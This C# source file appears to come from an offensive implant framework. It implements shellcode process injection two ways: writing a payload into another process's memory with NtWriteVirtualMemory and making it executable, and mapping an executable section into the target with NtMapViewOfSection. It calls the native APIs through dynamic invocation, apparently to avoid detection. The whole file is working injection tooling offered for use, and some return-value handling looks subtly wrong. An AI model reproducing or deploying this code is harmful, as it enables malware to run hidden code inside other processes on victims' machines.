using System;
using System.Collections.Generic;
using System.Linq;
using System.Diagnostics;
using System.Runtime.InteropServices;
using DroneService.Invocation.Data;

namespace DroneService.Invocation.Injection
{
    public abstract class AllocationTechnique
    {
        protected abstract IEnumerable<Type> SupportedPayloads { get; }

        public virtual bool IsSupportedPayloadType(PayloadType payload)
            => SupportedPayloads.Contains(payload.GetType());

        public abstract IntPtr Allocate(PayloadType payload, Process process);
    }

    public class NtWriteVirtualMemory : AllocationTechnique
    {
        protected override IEnumerable<Type> SupportedPayloads { get; }
            = new[] { typeof(PICPayload) };
        
        public override IntPtr Allocate(PayloadType payload, Process process)
        {
            var baseAddress = AllocateMemory(payload.Payload, process.Handle);
            
            if (!WriteMemory(payload.Payload, process.Handle, baseAddress))
                throw new Exception("Failed to write process memory");
            
            ChangeMemPermission(process.Handle, baseAddress, payload.Payload.Length);
            
            return baseAddress;
        }

        private IntPtr AllocateMemory(byte[] payload, IntPtr hProcess)
        {
            var baseAddress = IntPtr.Zero;
            var regionSize = (IntPtr)payload.Length;

            var result = DynamicInvoke.Native.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                0x1000 | 0x2000,
                0x04);

            return result;
        }

        private bool WriteMemory(byte[] payload, IntPtr hProcess, IntPtr baseAddress)
        {
            var buffer = Marshal.AllocHGlobal(payload.Length);
            Marshal.Copy(payload, 0, buffer, payload.Length);

            var result = DynamicInvoke.Native.NtWriteVirtualMemory(
                hProcess,
                baseAddress,
                buffer,
                (uint)payload.Length);
            
            Marshal.FreeHGlobal(buffer);

            return result > 0;
        }

        private void ChangeMemPermission(IntPtr hProcess, IntPtr baseAddress, int length)
        {
            var regionSize = (IntPtr)length;
            
            DynamicInvoke.Native.NtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                0x20);
        }
    }
    
    public class NtMapViewOfSection : AllocationTechnique
    {
        protected override IEnumerable<Type> SupportedPayloads { get; }
            = new[] { typeof(PICPayload) };

        private const uint LocalSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE;
        private const uint RemoteSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE;
        private const uint SectionAttributes = Win32.WinNT.SEC_COMMIT;

        public override IntPtr Allocate(PayloadType payload, Process process)
        {
            var hProcess = process.Handle;
            var hSelf = Process.GetCurrentProcess().Handle;
            var sectionAddress = CreateSection((uint)payload.Payload.Length, SectionAttributes);

            var details = MapSection(
                hSelf,
                sectionAddress,
                LocalSectionPermissions,
                IntPtr.Zero,
                Convert.ToUInt32(payload.Payload.Length));

            Marshal.Copy(payload.Payload, 0, details.BaseAddress, payload.Payload.Length);

            _ = UnmapSection(
                hSelf,
                details.BaseAddress);

            var newDetails = MapSection(
                hProcess,
                sectionAddress,
                RemoteSectionPermissions,
                IntPtr.Zero,
                (ulong)payload.Payload.Length);
            
            return newDetails.BaseAddress;
        }

        private static IntPtr CreateSection(ulong size, uint allocationAttributes)
        {
            var sectionHandle = new IntPtr();
            var maxSize = size;

            var result = DynamicInvoke.Native.NtCreateSection(
                ref sectionHandle,
                0x10000000,
                IntPtr.Zero,
                ref maxSize,
                Win32.WinNT.PAGE_EXECUTE_READWRITE,
                allocationAttributes,
                IntPtr.Zero);

            return result > 0 ? IntPtr.Zero : sectionHandle;
        }

        private static SectionDetails MapSection(IntPtr hProcess, IntPtr hSection, uint protection, IntPtr address, ulong sizeData)
        {
            var baseAddress = address;
            var size = sizeData;

            const uint disp = 2;
            const uint alloc = 0;

            _ = DynamicInvoke.Native.NtMapViewOfSection(
                hSection, 
                hProcess,
                ref baseAddress,
                IntPtr.Zero, 
                IntPtr.Zero, 
                IntPtr.Zero,
                ref size, 
                disp, 
                alloc,
                protection);

            return new SectionDetails(baseAddress, sizeData);
        }

        private readonly struct SectionDetails
        {
            public readonly IntPtr BaseAddress;
            public readonly ulong Size;

            public SectionDetails(IntPtr address, ulong size)
            {
                BaseAddress = address;
                Size = size;
            }
        }
        
        private static uint UnmapSection(IntPtr hProcess, IntPtr baseAddress)
        {
            return DynamicInvoke.Native.NtUnmapViewOfSection(hProcess, baseAddress);
        }
    }
}